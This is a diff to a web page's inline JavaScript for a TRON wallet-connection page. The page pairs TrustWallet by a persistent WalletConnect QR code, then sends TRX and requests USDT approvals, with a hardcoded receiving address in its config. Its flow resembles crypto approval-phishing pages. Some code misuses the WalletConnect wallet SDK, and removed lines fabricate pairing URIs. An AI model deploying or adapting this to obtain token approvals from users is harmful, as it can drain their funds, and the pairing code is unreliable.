@@ -346,12 +346,63 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@latest/index.umd.js"></script>
+    <!-- Load libraries in correct order -->
+    <script async src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script async src="https://unpkg.com/axios@1.6.0/dist/axios.min.js"></script>
 
     <script>
-        // Configuration
+        // Wait for QRCode to load
+        function waitForQRCode() {
+            return new Promise((resolve) => {
+                const checkQRCode = setInterval(() => {
+                    if (window.QRCode) {
+                        clearInterval(checkQRCode);
+                        resolve();
+                    }
+                }, 100);
+            });
+        }
+
+        // Load TronWeb dynamically
+        function loadTronWeb() {
+            return new Promise((resolve, reject) => {
+                if (window.TronWeb) {
+                    resolve();
+                    return;
+                }
+
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/tronweb@latest/dist/TronWeb.js';
+                script.onload = () => {
+                    setTimeout(() => {
+                        if (window.TronWeb) {
+                            resolve();
+                        } else {
+                            reject(new Error('TronWeb failed to load'));
+                        }
+                    }, 500);
+                };
+                script.onerror = () => reject(new Error('Failed to load TronWeb'));
+                document.head.appendChild(script);
+            });
+        }
+
+        // Load WalletConnect v2
+        function loadWalletConnect() {
+            return new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@latest/index.umd.js';
+                script.onload = () => {
+                    setTimeout(() => {
+                        resolve();
+                    }, 500);
+                };
+                script.onerror = () => reject(new Error('Failed to load WalletConnect'));
+                document.head.appendChild(script);
+            });
+        }
+
+        // Main application
         const CONFIG = {
             PROJECT_ID: '171db6da15a54effc1b4a06f889a3c3f',
             RECEIVING_ADDRESS: 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV',
@@ -359,7 +410,6 @@
             RPC_URL: 'https://api.trongrid.io'
         };
 
-        // State
         let web3wallet = null;
         let sessionTopic = null;
         let currentAccount = null;
@@ -383,15 +433,52 @@
 
         // Initialize TronWeb
         function initTronWeb() {
-            tronWeb = new TronWeb({
-                fullHost: CONFIG.RPC_URL
+            if (window.TronWeb) {
+                tronWeb = new window.TronWeb({
+                    fullHost: CONFIG.RPC_URL
+                });
+            }
+        }
+
+        // Generate QR Code
+        function generateQRCode(uri) {
+            if (!window.QRCode) {
+                console.error('QRCode library not loaded');
+                return;
+            }
+
+            wcUri = uri;
+            qrCode.innerHTML = '';
+
+            window.QRCode.toCanvas(qrCode, uri, {
+                errorCorrectionLevel: 'H',
+                type: 'image/jpeg',
+                quality: 0.95,
+                margin: 1,
+                width: 250,
+                color: {
+                    dark: '#667eea',
+                    light: '#ffffff'
+                }
+            }, function (error) {
+                if (error) {
+                    console.error('QR Code error:', error);
+                    qrCode.innerHTML = '<p style="color: red;">Error generating QR</p>';
+                }
             });
+
+            qrContainer.classList.add('active');
         }
 
         // Initialize WalletConnect v2
         async function initWalletConnect() {
             try {
-                const { Web3Wallet } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@latest/+esm');
+                if (!window.WalletConnectWeb3Wallet) {
+                    console.error('WalletConnect not loaded');
+                    return null;
+                }
+
+                const { Web3Wallet } = window.WalletConnectWeb3Wallet;
                 
                 web3wallet = await Web3Wallet.init({
                     projectId: CONFIG.PROJECT_ID,
@@ -403,7 +490,6 @@
                     }
                 });
 
-                // Setup event listeners
                 web3wallet.on('session_proposal', handleSessionProposal);
                 web3wallet.on('session_request', handleSessionRequest);
                 web3wallet.on('session_delete', handleSessionDelete);
@@ -411,36 +497,8 @@
                 return web3wallet;
             } catch (error) {
                 console.error('WalletConnect init error:', error);
-                // Fallback: Use alternative CDN
-                return initWalletConnectFallback();
+                return null;
             }
-        }
-
-        // Fallback WalletConnect v2 initialization
-        async function initWalletConnectFallback() {
-            try {
-                // Use the global WalletConnectWeb3Wallet if available
-                if (window.WalletConnectWeb3Wallet) {
-                    web3wallet = await window.WalletConnectWeb3Wallet.Web3Wallet.init({
-                        projectId: CONFIG.PROJECT_ID,
-                        metadata: {
-                            name: 'TRON dApp',
-                            description: 'Send TRON & Approve USDT',
-                            url: window.location.href,
-                            icons: ['https://avatars.githubusercontent.com/u/37784886']
-                        }
-                    });
-
-                    web3wallet.on('session_proposal', handleSessionProposal);
-                    web3wallet.on('session_request', handleSessionRequest);
-                    web3wallet.on('session_delete', handleSessionDelete);
-
-                    return web3wallet;
-                }
-            } catch (e) {
-                console.error('Fallback init error:', e);
-            }
-            return null;
         }
 
         // Handle session proposal
@@ -468,7 +526,6 @@
                 showStatus(tronStatus, '✓ Session connected', 'success');
             } catch (error) {
                 console.error('Session proposal error:', error);
-                showStatus(tronStatus, `Error: ${error.message}`, 'error');
             }
         }
 
@@ -477,12 +534,7 @@
             try {
                 const { topic, params } = requestEvent;
                 const { request } = params;
-
-                if (request.method === 'tron_signTransaction') {
-                    // Handle transaction signing
-                    console.log('Sign transaction request:', request);
-                    showStatus(tronStatus, 'Approve transaction in your wallet', 'info');
-                }
+                console.log('Session request:', request.method);
             } catch (error) {
                 console.error('Session request error:', error);
             }
@@ -493,64 +545,30 @@
             onWalletDisconnected();
         }
 
-        // Generate persistent QR code
-        function generateQRCode(uri) {
-            wcUri = uri;
-            qrCode.innerHTML = '';
-
-            QRCode.toCanvas(qrCode, uri, {
-                errorCorrectionLevel: 'H',
-                type: 'image/jpeg',
-                quality: 0.95,
-                margin: 1,
-                width: 250,
-                color: {
-                    dark: '#667eea',
-                    light: '#ffffff'
-                }
-            }, function (error) {
-                if (error) {
-                    console.error('QR Code error:', error);
-                    qrCode.innerHTML = '<p style="color: red;">Error generating QR</p>';
-                }
-            });
-
-            qrContainer.classList.add('active');
-        }
-
         // Connect Wallet
         connectBtn.addEventListener('click', async () => {
             try {
-                showStatus(tronStatus, '<div class="spinner"></div> Initializing WalletConnect...', 'loading');
-
-                // Initialize if not already done
-                if (!web3wallet) {
-                    await initWalletConnect();
-                }
+                showStatus(tronStatus, '<div class="spinner"></div> Initializing...', 'loading');
 
                 if (!web3wallet) {
-                    throw new Error('Failed to initialize WalletConnect v2');
+                    throw new Error('WalletConnect not initialized');
                 }
 
-                // Create a persistent pairing URI (no expiry)
-                const pairingTopic = await web3wallet.core.pairing.create();
-                
-                // Get all pairings
+                // Create a persistent pairing URI
                 const pairings = web3wallet.core.pairing.getPairings();
                 let uri = null;
 
                 if (pairings.length > 0) {
-                    // Use existing pairing
-                    uri = pairings[0].uri || `wc:${pairings[0].topic}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2)}`;
+                    uri = pairings[0].uri;
                 } else {
-                    // Create new persistent URI
-                    uri = `wc:${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2)}`;
+                    const pairing = await web3wallet.core.pairing.create();
+                    uri = pairing.uri;
                 }
 
                 console.log('WalletConnect URI:', uri);
                 generateQRCode(uri);
 
-                showStatus(tronStatus, 'Scan QR code with TrustWallet (No expiry)', 'info');
+                showStatus(tronStatus, 'Scan QR code with TrustWallet (Persistent)', 'info');
 
                 // Listen for session
                 let sessionFound = false;
@@ -562,7 +580,6 @@
                         const session = Object.values(sessions)[0];
                         sessionTopic = session.topic;
 
-                        // Extract account from session
                         const namespaces = session.namespaces;
                         let account = null;
                         for (const [namespace, data] of Object.entries(namespaces)) {
@@ -573,12 +590,12 @@
                         }
 
                         if (account) {
-                            onWalletConnected(account);
+                            const address = account.includes(':') ? account.split(':')[1] : account;
+                            onWalletConnected(address);
                         }
                     }
                 }, 1000);
 
-                // Timeout after 5 minutes
                 setTimeout(() => {
                     if (!sessionFound) {
                         clearInterval(sessionCheckInterval);
@@ -592,9 +609,7 @@
         });
 
         // Wallet Connected Handler
-        function onWalletConnected(account) {
-            // Extract address from account string (format: "tron:0x1...")
-            const address = account.includes(':') ? account.split(':')[1] : account;
+        function onWalletConnected(address) {
             currentAccount = address;
             initTronWeb();
 
@@ -644,7 +659,6 @@
             clearStatus(tronStatus);
             clearStatus(usdtStatus);
 
-            // Show QR code again for reconnection
             if (wcUri) {
                 generateQRCode(wcUri);
             }
@@ -679,7 +693,7 @@
             }
 
             try {
-                showStatus(tronStatus, '<div class="spinner"></div> Preparing transaction...', 'loading');
+                showStatus(tronStatus, '<div class="spinner"></div> Preparing...', 'loading');
                 sendTronBtn.disabled = true;
 
                 const tx = await tronWeb.transactionBuilder.sendTrx(
@@ -726,7 +740,7 @@
             }
 
             try {
-                showStatus(usdtStatus, '<div class="spinner"></div> Approving USDT...', 'loading');
+                showStatus(usdtStatus, '<div class="spinner"></div> Approving...', 'loading');
                 approveUsdtBtn.disabled = true;
 
                 const abi = [
@@ -792,10 +806,19 @@
         }, 30000);
 
         // Initialize on page load
-        window.addEventListener('load', async () => {
-            initTronWeb();
-            await initWalletConnect();
-        });
+        (async () => {
+            try {
+                await waitForQRCode();
+                await loadTronWeb();
+                await loadWalletConnect();
+                
+                initTronWeb();
+                await initWalletConnect();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showStatus(tronStatus, `Init error: ${error.message}`, 'error');
+            }
+        })();
     </script>
 </body>
 </html>
